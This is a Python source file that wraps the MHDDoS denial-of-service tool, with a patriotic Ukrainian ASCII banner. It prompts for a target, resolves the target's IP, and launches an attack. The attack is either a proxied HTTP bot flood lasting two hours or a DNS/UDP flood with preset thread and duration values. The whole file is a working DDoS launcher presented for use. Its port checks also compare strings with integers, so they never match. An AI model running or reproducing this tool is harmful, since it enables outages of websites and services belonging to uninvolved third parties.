import sys
from sys import argv

from humanfriendly.terminal import ansi_wrap

from MHDDoS.start import start, ToolsConsole


def print_flair():

    BLUE = (0, 91, 187)
    YELLOW = (255, 213, 0)
    GREEN = (8, 255, 8)
    RED = (255, 0, 0)

    heart = ansi_wrap("♥", color=RED)
    flair_string = "\n" + \
                   "A light freedom-infused MHDDoS wrapper...\n" + \
                   "\n" + \
                   ansi_wrap("██████╗░██╗░░░██╗██████╗░██╗███████╗██╗░░██╗░█████╗░██╗░░██╗\n", color=BLUE) + \
                   ansi_wrap("██╔══██╗╚██╗░██╔╝██╔══██╗██║╚════██║██║░░██║██╔══██╗██║░██╔╝\n", color=BLUE) + \
                   ansi_wrap("██████╔╝░╚████╔╝░██████╔╝██║░░███╔═╝███████║██║░░██║█████═╝░\n", color=BLUE) + \
                   ansi_wrap("██╔═══╝░░░╚██╔╝░░██╔══██╗██║██╔══╝░░██╔══██║██║░░██║██╔═██╗░\n", color=YELLOW) + \
                   ansi_wrap("██║░░░░░░░░██║░░░██║░░██║██║███████╗██║░░██║╚█████╔╝██║░╚██╗\n", color=YELLOW) + \
                   ansi_wrap("╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\n", color=YELLOW) + \
                   "\n" + \
                   f"                                 ...from Ukraine with love {heart}\n"
    print(flair_string)
    print(ansi_wrap("Initializing...\n", color=GREEN))


def kara():
    print_flair()

    if len(argv) < 2:
        address = input("Enter target address: ")
        if not address:
            print("Target not specified, aborting execution.")
            sys.exit(1)
        argv.insert(1, address)
    address = argv[1]

    port = None
    if len(argv) > 2:
        port = argv[2]
        if port == 53:
            print(f"Port provided ({port}). It's a DNS port. Using DNS mode...")
        else:
            print(f"Port provided ({port}). Using UDP mode...")

        # If we have a port, we need to get an IP of the target
        dns_info = ToolsConsole.info(address)
        if not dns_info["success"]:
            print(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
            sys.exit(1)

        address = dns_info['ip']

    if not port or port == 80 or port == 443:
        # Prepare URL attack arguments
        argv[1] = "BOT"
        argv.insert(2, address)
        argv.insert(3, "5")
        argv.insert(4, "100")
        argv.insert(5, "socks5.txt")
        argv.insert(6, "1000000000")
        argv.insert(7, "7200")
    else:
        # Prepare IP attack arguments
        argv[1] = "DNS" if port == 53 else "UDP"
        argv.insert(2, f"{address}:{port}")
        argv.insert(3, "100")
        argv.insert(4, "1000000000")

    start()


if __name__ == '__main__':
    try:
        kara()
    except KeyboardInterrupt:
        print("\nExecution aborted.\n")
